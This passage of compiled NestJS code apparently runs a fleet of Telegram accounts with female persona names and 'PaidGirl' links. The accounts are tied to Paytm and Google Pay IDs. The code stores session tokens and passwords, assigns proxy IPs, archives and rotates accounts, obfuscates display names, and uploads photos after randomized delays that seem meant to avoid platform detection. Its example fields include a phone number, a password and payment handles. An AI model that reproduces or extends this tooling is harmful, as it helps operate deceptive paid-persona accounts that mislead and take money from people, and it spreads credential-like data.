        const client = await connection_manager_1.connectionManager.getClient(mobile, { handler: true, autoDisconnect: false });
        await this.telegramService.updatePrivacyforDeletedAccount(mobile);
        this.logger.log('Formalities finished');
        await connection_manager_1.connectionManager.unregisterClient(mobile);
        await this.notify('Formalities finished');
    }
    async archiveOldClient(existingClient, existingClientUser, existingMobile, days) {
        try {
            const availableDate = new Date(Date.now() + (days + 1) * 24 * 60 * 60 * 1000)
                .toISOString()
                .split('T')[0];
            const bufferClientDto = {
                clientId: existingClient.clientId,
                mobile: existingMobile,
                availableDate,
                session: existingClient.session,
                tgId: existingClientUser.tgId,
                channels: 170,
                status: days > 35 ? 'inactive' : 'active',
                inUse: false,
            };
            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);
            this.logger.log('client Archived: ', updatedBufferClient['_doc']);
            await this.notify('old Client Archived');
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Error in Archiving Old Client: ${existingMobile}`, true);
            await this.notify(errorDetails.message);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                this.logger.log('Deleting User: ', existingClientUser.mobile);
                await this.bufferClientService.markAsInactive(existingClientUser.mobile, errorDetails.message);
            }
            else {
                this.logger.log('Not Deleting user');
            }
        }
    }
    async updateClient(clientId, message = '') {
        this.logger.log(`Updating Client: ${clientId} - ${message}`);
        if (!this.canUpdateClient(clientId))
            return;
        const client = await this.findOne(clientId);
        if (!client) {
            this.logger.error(`Client not found: ${clientId}`);
            return;
        }
        try {
            this.lastUpdateMap.set(clientId, Date.now());
            const telegramClient = await connection_manager_1.connectionManager.getClient(client.mobile, { handler: false });
            if (!telegramClient)
                throw new Error(`Unable to fetch Telegram client for ${client.mobile}`);
            await (0, Helpers_1.sleep)(2000);
            const me = await telegramClient.getMe();
            if (!me)
                throw new Error(`Unable to fetch 'me' for ${clientId}`);
            await this.updateClientUsername(client, me);
            await this.updateClientName(client, telegramClient, me);
            await this.updateClientPrivacy(client, telegramClient);
            await this.updateClientPhotos(client, telegramClient);
            await this.notify(`Updated Client: ${clientId} - ${message}`);
            if (client.deployKey)
                await (0, fetchWithTimeout_1.fetchWithTimeout)(client.deployKey);
        }
        catch (error) {
            this.lastUpdateMap.delete(clientId);
            (0, parseError_1.parseError)(error, `[${clientId}] [${client.mobile}] updateClient failed`);
            this.bufferClientService.update(client.mobile, { inUse: false, status: 'inactive' });
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(client.mobile);
        }
    }
    canUpdateClient(clientId) {
        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;
        if (Date.now() - lastUpdate < CONFIG.UPDATE_CLIENT_COOLDOWN) {
            const waitTime = Math.ceil((CONFIG.UPDATE_CLIENT_COOLDOWN - (Date.now() - lastUpdate)) / 1000);
            this.logger.log(`Skipping update for ${clientId} - cooldown not elapsed. Try again in ${waitTime} seconds`);
            return false;
        }
        return true;
    }
    async updateClientUsername(client, me) {
        const updatedUsername = await this.telegramService.updateUsernameForAClient(client.mobile, client.clientId, client.name, me.username);
        if (updatedUsername) {
            await this.update(client.clientId, { username: updatedUsername });
            this.logger.log(`[${client.clientId}] Username updated to: ${updatedUsername}`);
            await (0, Helpers_1.sleep)(10000);
        }
        else {
            this.logger.warn(`[${client.clientId}] Failed to update username`);
        }
    }
    async updateClientName(client, tgManager, me) {
        if (!(0, checkMe_utils_1.isIncludedWithTolerance)((0, checkMe_utils_1.safeAttemptReverse)(me?.firstName), client.name)) {
            this.logger.log(`[${client.clientId}] Name mismatch. Actual: ${me.firstName}, Expected: ${client.name}`);
            await tgManager.updateProfile(`${(0, utils_1.obfuscateText)(client.name, {
                maintainFormatting: false,
                preserveCase: true,
                useInvisibleChars: false
            })} ${(0, utils_1.getCuteEmoji)()}`, '');
            await (0, Helpers_1.sleep)(5000);
        }
        else {
            this.logger.log(`[${client.clientId}] Name already correct`);
        }
    }
    async updateClientPrivacy(client, tgManager) {
        await tgManager.updatePrivacy();
        this.logger.log(`[${client.clientId}] Privacy settings updated`);
        await (0, Helpers_1.sleep)(5000);
    }
    async updateClientPhotos(client, telegramClient) {
        const photos = await telegramClient.client.invoke(new tl_1.Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));
        const photoCount = photos?.photos?.length || 0;
        if (photoCount < 2) {
            this.logger.warn(`[${client.clientId}] No profile photos found. Uploading new ones...`);
            if (photoCount > 0)
                await telegramClient.deleteProfilePhotos();
            await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
            await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
            for (const photo of CONFIG.PHOTO_PATHS) {
                await telegramClient.updateProfilePic(path_1.default.join(process.cwd(), photo));
                this.logger.debug(`[${client.clientId}] Uploaded profile photo: ${photo}`);
                await (0, Helpers_1.sleep)(20000 + Math.random() * 15000);
            }
        }
        else {
            this.logger.log(`[${client.clientId}] Profile photos already exist (${photoCount})`);
        }
    }
    async updateClients() {
        const clients = await this.findAll();
        for (const client of clients) {
            await this.updateClient(client.clientId, `Force Updating Client: ${client.clientId}`);
        }
    }
    async executeQuery(query, sort, limit, skip) {
        if (!query)
            throw new common_1.BadRequestException('Query is invalid.');
        const queryExec = this.clientModel.find(query);
        if (sort)
            queryExec.sort(sort);
        if (limit)
            queryExec.limit(limit);
        if (skip)
            queryExec.skip(skip);
        return queryExec.exec();
    }
    async getPromoteMobiles(clientId) {
        if (!clientId)
            throw new common_1.BadRequestException('ClientId is required');
        const promoteClients = await this.promoteClientModel.find({ clientId }).lean();
        return promoteClients.map((pc) => pc.mobile).filter((mobile) => mobile);
    }
    async getAllPromoteMobiles() {
        const allPromoteClients = await this.promoteClientModel
            .find({ clientId: { $exists: true } })
            .lean();
        return allPromoteClients.map((pc) => pc.mobile);
    }
    async isPromoteMobile(mobile) {
        const promoteClient = await this.promoteClientModel.findOne({ mobile }).lean();
        return {
            isPromote: !!promoteClient && !!promoteClient.clientId,
            clientId: promoteClient?.clientId,
        };
    }
    async addPromoteMobile(clientId, mobileNumber) {
        const client = await this.clientModel.findOne({ clientId }).lean();
        if (!client)
            throw new common_1.NotFoundException(`Client ${clientId} not found`);
        const existingPromoteClient = await this.promoteClientModel.findOne({ mobile: mobileNumber }).lean();
        if (existingPromoteClient) {
            if (existingPromoteClient.clientId === clientId) {
                throw new common_1.BadRequestException(`Mobile ${mobileNumber} is already a promote mobile for client ${clientId}`);
            }
            else if (existingPromoteClient.clientId) {
                throw new common_1.BadRequestException(`Mobile ${mobileNumber} is already assigned to client ${existingPromoteClient.clientId}`);
            }
            else {
                await this.promoteClientModel.updateOne({ mobile: mobileNumber }, { $set: { clientId } });
            }
        }
        else {
            throw new common_1.NotFoundException(`Mobile ${mobileNumber} not found in PromoteClient collection. Please add it first.`);
        }
        return client;
    }
    async removePromoteMobile(clientId, mobileNumber) {
        const client = await this.clientModel.findOne({ clientId }).lean();
        if (!client)
            throw new common_1.NotFoundException(`Client ${clientId} not found`);
        const result = await this.promoteClientModel.updateOne({ mobile: mobileNumber, clientId }, { $unset: { clientId: 1 } });
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Mobile ${mobileNumber} is not a promote mobile for client ${clientId}`);
        }
        return client;
    }
};
exports.ClientService = ClientService;
exports.ClientService = ClientService = ClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(client_schema_1.Client.name)),
    __param(1, (0, mongoose_1.InjectModel)(promote_client_schema_1.PromoteClient.name)),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        mongoose_2.Model,
        Telegram_service_1.TelegramService,
        buffer_client_service_1.BufferClientService,
        users_service_1.UsersService])
], ClientService);


/***/ }),

/***/ "./src/components/clients/dto/create-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/create-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateClientDto {
}
exports.CreateClientDto = CreateClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "gpayId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client', required: false }),
    __metadata("design:type", Array)
], CreateClientDto.prototype, "dedicatedIps", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'US', description: 'Preferred country for IP assignment', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "preferredIpCountry", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Whether to auto-assign IPs to mobile numbers', required: false }),
    __metadata("design:type", Boolean)
], CreateClientDto.prototype, "autoAssignIps", void 0);


/***/ }),

/***/ "./src/components/clients/dto/index.ts":
/*!*********************************************!*\
  !*** ./src/components/clients/dto/index.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-client.dto */ "./src/components/clients/dto/create-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./search-client.dto */ "./src/components/clients/dto/search-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-client.dto */ "./src/components/clients/dto/update-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./setup-client.dto */ "./src/components/clients/dto/setup-client.dto.ts"), exports);


/***/ }),

/***/ "./src/components/clients/dto/search-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/search-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchClientDto {
}
exports.SearchClientDto = SearchClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Database collection name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Name of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Phone number of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "number", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Password of the client' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Promotion Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Clientname of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Deployment key URL' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Main account of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Product associated with the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Search by client ID that has promote mobiles assigned' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^(true|false)$/i, { message: 'hasPromoteMobiles must be either "true" or "false"' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "hasPromoteMobiles", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paytm QR ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Google Pay ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "gpayId", void 0);


/***/ }),

/***/ "./src/components/clients/dto/setup-client.dto.ts":
/*!********************************************************!*\
  !*** ./src/components/clients/dto/setup-client.dto.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SetupClientQueryDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SetupClientQueryDto {
    constructor() {
        this.days = 0;
        this.archiveOld = true;
        this.formalities = true;
    }
}
exports.SetupClientQueryDto = SetupClientQueryDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        type: Number,
        default: 3
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Type)(() => Number),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SetupClientQueryDto.prototype, "days", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        default: true
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => {
        console.log("archiveOld: ", value);
        return value === 'true' || value === true;
    }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SetupClientQueryDto.prototype, "archiveOld", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        type: String
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SetupClientQueryDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        default: true
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => {
        console.log("formalities: ", value);
        return value === 'true' || value === true;
    }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SetupClientQueryDto.prototype, "formalities", void 0);


/***/ }),

/***/ "./src/components/clients/dto/update-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/update-client.dto.ts ***!
  \*********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_client_dto_1 = __webpack_require__(/*! ./create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
class UpdateClientDto extends (0, swagger_1.PartialType)(create_client_dto_1.CreateClientDto) {
}
exports.UpdateClientDto = UpdateClientDto;


/***/ }),

/***/ "./src/components/clients/index.ts":
/*!*****************************************!*\
  !*** ./src/components/clients/index.ts ***!
  \*****************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientService = exports.ClientModule = exports.ClientController = void 0;
var client_controller_1 = __webpack_require__(/*! ./client.controller */ "./src/components/clients/client.controller.ts");
Object.defineProperty(exports, "ClientController", ({ enumerable: true, get: function () { return client_controller_1.ClientController; } }));
var client_module_1 = __webpack_require__(/*! ./client.module */ "./src/components/clients/client.module.ts");
Object.defineProperty(exports, "ClientModule", ({ enumerable: true, get: function () { return client_module_1.ClientModule; } }));
var client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
Object.defineProperty(exports, "ClientService", ({ enumerable: true, get: function () { return client_service_1.ClientService; } }));
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/clients/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/clients/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/clients/schemas/client.schema.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/schemas/client.schema.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientSchema = exports.Client = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Client = class Client {
};
exports.Client = Client;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'mobile number of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==', description: 'Session token' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "qrId", void 0);
__decorate([
